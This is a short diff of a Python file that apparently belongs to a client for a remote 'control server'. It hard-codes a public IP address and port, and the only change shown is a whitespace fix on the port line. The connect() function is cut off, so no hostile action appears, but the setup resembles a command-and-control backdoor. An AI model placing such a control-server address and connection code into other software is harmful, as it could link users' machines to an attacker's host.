@@ -4,7 +4,7 @@ import os
 
 # Connection settings
 IP = "185.139.7.144"  # Control server IP address
-PORT =  41321     # Control server port
+PORT = 41321     # Control server port
 
 def connect():
     """
